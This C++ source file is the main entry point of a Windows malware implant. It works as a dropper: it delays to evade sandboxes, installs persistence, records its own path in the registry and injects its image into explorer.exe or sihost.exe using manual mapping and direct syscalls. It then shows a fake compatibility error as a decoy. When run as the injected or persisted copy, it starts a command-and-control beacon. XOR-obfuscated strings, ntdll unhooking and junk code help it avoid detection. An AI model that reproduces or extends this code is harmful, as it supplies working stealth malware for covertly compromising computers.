#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "evasion/JunkLogic.h"
#include "evasion/Bloat.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>
#include <thread>

namespace {
    // XOR Encrypted Strings (Multi-byte Key)
    const wchar_t kExplorerEnc[] = { 'e'^0x4B, 'x'^0x1F, 'p'^0x8C, 'l'^0x3E, 'o'^0x4B, 'r'^0x1F, 'e'^0x8C, 'r'^0x3E, '.'^0x4B, 'e'^0x1F, 'x'^0x8C, 'e'^0x3E }; // explorer.exe
    const wchar_t kSvchostEnc[] = { 's'^0x4B, 'v'^0x1F, 'c'^0x8C, 'h'^0x3E, 'o'^0x4B, 's'^0x1F, 't'^0x8C, '.'^0x3E, 'e'^0x4B, 'x'^0x1F, 'e'^0x8C }; // svchost.exe
    const wchar_t kVolatileEnvEnc[] = { 'V'^0x4B, 'o'^0x1F, 'l'^0x8C, 'a'^0x3E, 't'^0x4B, 'i'^0x1F, 'l'^0x8C, 'e'^0x3E, ' '^0x4B, 'E'^0x1F, 'n'^0x8C, 'v'^0x3E, 'i'^0x4B, 'r'^0x1F, 'o'^0x8C, 'n'^0x3E, 'm'^0x4B, 'e'^0x1F, 'n'^0x8C, 't'^0x3E }; // Volatile Environment
    const wchar_t kDropperPathEnc[] = { 'D'^0x4B, 'r'^0x1F, 'o'^0x8C, 'p'^0x3E, 'p'^0x4B, 'e'^0x1F, 'r'^0x8C, 'P'^0x3E, 'a'^0x4B, 't'^0x1F, 'h'^0x8C }; // DropperPath
    const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x4B, 'u'^0x1F, 'n'^0x8C, 't'^0x3E, 'i'^0x4B, 'm'^0x1F, 'e'^0x8C, 'B'^0x3E, 'r'^0x4B, 'o'^0x1F, 'k'^0x8C, 'e'^0x3E, 'r'^0x4B, '.'^0x1F, 'e'^0x8C, 'x'^0x3E, 'e'^0x4B }; // RuntimeBroker.exe
    const wchar_t kSihostEnc[] = { 's'^0x4B, 'i'^0x1F, 'h'^0x8C, 'o'^0x3E, 's'^0x4B, 't'^0x1F, '.'^0x8C, 'e'^0x3E, 'x'^0x4B, 'e'^0x1F }; // sihost.exe

    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess(const std::wstring& sPath) {
        std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
        std::wstring svchost = utils::DecryptW(kSvchostEnc, 11);
        std::wstring runtimeBroker = utils::DecryptW(kRuntimeBrokerEnc, 17);

        std::wstring lowerPath = sPath;
        for (auto& c : lowerPath) c = (wchar_t)::towlower(c);

        if (lowerPath.find(explorer) != std::wstring::npos) return true;
        if (lowerPath.find(svchost) != std::wstring::npos) return true;
        if (lowerPath.find(runtimeBroker) != std::wstring::npos) return true;
        return false;
    }

    bool IsRunningFromPersistLocation(const std::wstring& sPath) {
        std::wstring lowerPath = sPath;
        for (auto& c : lowerPath) c = (wchar_t)::towlower(c);

        if (lowerPath.find(L"\\microsoft\\windows\\dnscache\\") != std::wstring::npos) {
            return true;
        }
        return false;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    evasion::InitializeBloat();
    evasion::JunkLogic::GenerateEntropy();
    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    wchar_t currentPathBuf[MAX_PATH];
    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
    std::wstring currentPath(currentPathBuf);

    LOG_INFO("--- WINMAIN ---");

    evasion::JunkLogic::PerformComplexMath();

    // Priority 1: Check if we are a Foothold (injected/hollowed)
    if (IsSystemProcess(currentPath)) {
        LOG_INFO("Detected Role: Foothold (Injected)");
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        (void)hr;

        evasion::JunkLogic::ScrambleMemory();

        // Try to establish persistence from IPC path if available
        wchar_t dropperPath[MAX_PATH] = {0};
        HKEY hKey;
        std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
        std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
        if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(dropperPath);
            if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                LOG_INFO("Foothold IPC: Source path found.");
                persistence::establishPersistence(dropperPath);
            }
            RegCloseKey(hKey);
        } else {
            persistence::ReinstallPersistence();
        }

        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    evasion::JunkLogic::GenerateEntropy();

    // Priority 2: Check if we are running from a persisted location
    if (IsRunningFromPersistLocation(currentPath)) {
        LOG_INFO("Detected Role: Persisted");
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        (void)hr;
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    // ROLE: Dropper
    LOG_INFO("Detected Role: Dropper");

    // Behavioral Evasion
    int jitter = evasion::Detection::GetJitterDelay();
    if (jitter > 0) {
        LOG_WARN("Evasion: Jitter delay active.");
        Sleep(jitter * 1000);
    } else {
        Sleep(3000 + (GetTickCount() % 5000));
    }

    evasion::JunkLogic::PerformComplexMath();

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    (void)hr;

    // 1. Establish Persistence immediately from dropper
    persistence::establishPersistence();

    evasion::JunkLogic::ScrambleMemory();

    // 2. Store self path for Foothold IPC
    HKEY hKeyIPC;
    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
    if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKeyIPC, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKeyIPC, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
        RegCloseKey(hKeyIPC);
    }

    evasion::JunkLogic::GenerateEntropy();

    // 3. Attempt Relocation (Injection)
    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        // Try explorer.exe first
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            LOG_INFO("Dropper: Foothold established in explorer.exe.");
            decoy::ShowCompatibilityError();
            CoUninitialize();
            return 0;
        }

        // Fallback: Try sihost.exe (Shell Infrastructure Host)
        std::wstring sihost = utils::DecryptW(kSihostEnc, 10);
        DWORD siPid = evasion::Injector::GetProcessIdByName(sihost);
        if (siPid != 0) {
            HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, siPid);
            if (hProc) {
                PVOID pRemoteBase = NULL;
                if (evasion::Injector::MapAndInject(hProc, selfImage, &pRemoteBase)) {
                    PBYTE pSrcData = (PBYTE)selfImage.data();
                    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pSrcData + ((PIMAGE_DOS_HEADER)pSrcData)->e_lfanew);
                    PVOID pEntry = (PVOID)((PBYTE)pRemoteBase + pNt->OptionalHeader.AddressOfEntryPoint);
                    HANDLE hThread = NULL;
                    if (NT_SUCCESS(evasion::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, pEntry, NULL, 0, 0, 0, 0, NULL))) {
                        CloseHandle(hThread);
                        LOG_INFO("Dropper: Foothold established in sihost.exe.");
                        CloseHandle(hProc);
                        decoy::ShowCompatibilityError();
                        CoUninitialize();
                        return 0;
                    }
                }
                CloseHandle(hProc);
            }
        }
    }

    decoy::ShowCompatibilityError();
    CoUninitialize();
    return 0;
}
